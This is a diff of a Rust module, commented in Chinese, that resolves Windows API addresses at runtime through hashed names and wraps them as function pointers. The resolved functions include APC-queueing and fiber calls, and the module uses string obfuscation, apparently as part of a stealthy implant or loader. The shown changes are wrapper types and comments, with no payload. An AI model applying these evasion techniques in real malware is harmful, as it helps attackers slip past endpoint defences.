@@ -1,4 +1,4 @@
-#![allow(unused)]
+// #![allow(unused)]
 
 // 本文件(mod)在项目中作用:
 // 提供其他模块用到的windows api/dll的rust定义:找到地址后通过transmute转为rust函数指针(主动调用native api的ffi安全wrapper)
@@ -9,18 +9,121 @@
 
 use core::{ffi::c_void,mem::transmute,ptr::null_mut};
 use uwd::syscall;
-use crate::{debug_log,stealth_bail};
-use puerto::hash::{fnv1a_utf16,fnv1a_utf16_from_u8};
+use puerto::hash::{fnv1a_utf16};
 use puerto::types::{EVENT_TYPE,HANDLE,LARGE_INTEGER,NTSTATUS,STATUS_UNSUCCESSFUL};
 use puerto::module::{get_module_address,get_proc_address,get_ntdll_address};
 use spin::Once;
-
 // obfstr!底层加密/解密都在stack/数据段完成,无内存分配
 use obfstr::{obfstr as s};
 
 use crate::types::*;
 
-/// Structure containing all function pointers resolved only once.用于动态计算项目使用的win api地址
+/// Wrapper for DLL base addresses stored as `u64`.
+/// 
+/// 在其上定义不同的方法,用于和win底层交互
+#[derive(Default, Debug, Clone, Copy)]
+// 重载编译器默认内存布局行为:被标记的符合类型在内存布局memory layout和应用二进制接口abi,必须与其唯一的非零大小字段完全等价且透明.即将Dll对象视为u64(大小和alignment都一致)
+#[repr(transparent)]
+pub struct Dll(u64);
+
+impl Dll {
+
+    /// returns the address as a mutable pointer
+    pub fn as_ptr(self)->*mut c_void {
+        self.0 as *mut c_void
+    }
+
+/// returns the address as u64
+pub fn as_u64(self)->u64 {
+    self.0 
+}
+
+}
+
+
+/// trait From用于无损/绝对不失败的类型转换
+/// *mut c_void->Dll
+/// 实现该trait自动获得into()
+impl From<*mut c_void> for Dll {
+    fn from(ptr: *mut c_void) -> Self {
+        Self(ptr as u64)
+    }
+}
+
+/// u64->dll.自动获得into()
+impl From<u64> for Dll {
+    fn from(addr: u64) -> Self {
+        Self(addr)
+    }
+}
+
+
+/// wrapper for used dll
+#[derive(Debug,Default,Clone, Copy)]
+pub struct Modules{
+    pub ntdll: Dll,
+    pub kernel32: Dll,
+    pub cryptbase: Dll,
+    pub kernelbase: Dll
+}
+
+/// Wrapper for WinAPI function pointers stored as `u64`.
+#[derive(Default, Debug, Clone, Copy)]
+#[repr(transparent)]
+pub struct WinApi(u64);
+impl WinApi {
+    /// Returns the pointer as a const `*const c_void`.
+    #[inline]
+    pub fn as_ptr(self) -> *const c_void {
+        self.0 as *const c_void
+    }
+
+    /// Returns the pointer as a mutable `*mut c_void`.
+    #[inline]
+    pub fn as_mut_ptr(self) -> *mut c_void {
+        self.0 as *mut c_void
+    }
+
+    /// Returns true if the pointer is null.
+    #[inline]
+    pub fn is_null(self) -> bool {
+        self.0 == 0
+    }
+
+    /// Returns the address as a `u64`.
+    #[inline]
+    pub fn as_u64(self) -> u64 {
+        self.0
+    }
+}
+
+impl From<*const c_void> for WinApi {
+    fn from(ptr: *const c_void) -> Self {
+        // Self代表调用from的类型,这里因为在WinApi中,这里Self=WinApi
+        Self(ptr as u64)
+    }
+}
+
+impl From<*mut c_void> for WinApi {
+    fn from(ptr: *mut c_void) -> Self {
+        Self(ptr as u64)
+    }
+}
+
+impl From<u64> for WinApi {
+    fn from(addr: u64) -> Self {
+        Self(addr)
+    }
+}
+
+impl From<WinApi> for u64 {
+    fn from(api: WinApi) -> Self {
+        api.0
+    }
+}
+
+
+/// Structure containing all function pointers resolved only once.用于动态计算项目使用的win api地址,并在impl中使用transmute转为rust 函数指针
 pub struct Winapis {
     pub NtSignalAndWaitForSingleObject: NtSignalAndWaitForSingleObjectFn,
     pub NtQueueApcThread: NtQueueApcThreadFn,
@@ -54,6 +157,8 @@ pub struct Winapis {
 static WINAPIS:Once<Winapis>=Once::new();
 
 /// Returns a reference to the resolved winapis structure.同时实现Winapis结构体的初始化
+/// 
+/// 和config.rs中的fn winapis()都是在运行初始化阶段(运行时)实时计算内存中对应的函数地址,区别是这里缓存为全局的可执行函数指针.config.rs中被转为WinApi包裹的u64纯数值(地址数据)详见注释1
 #[inline]
 pub fn winapis() -> &'static Winapis {
     WINAPIS.call_once(|| {
@@ -431,3 +536,9 @@ pub fn SwitchToFiber(lpFiber: *mut c_void) {
 pub extern "C" fn NtSetEvent2(_: *mut c_void, event: *mut c_void, _: *mut c_void, _: u32) {
     NtSetEvent(event, null_mut());
 }
+
+
+// 注释1
+// Winapis  结构体中对应的字段类型是  NtSignalAndWaitForSingleObjectFn(一个可执行的函数指针);而调用的get_proc_address  的返回类型是  Option<*mut c_void> ，它解包后是一个原始数据指针
+// Rust中 出于安全考虑，编译器绝对禁止使用  as  运算符直接将一个原始数据指针（如  *mut c_void ）强制转换为一个函数指针（如  fn(...) ）
+// 唯一解决方案是调用  core::mem::transmute:改变了编译器在后续代码中对待这块内存的解析态度  
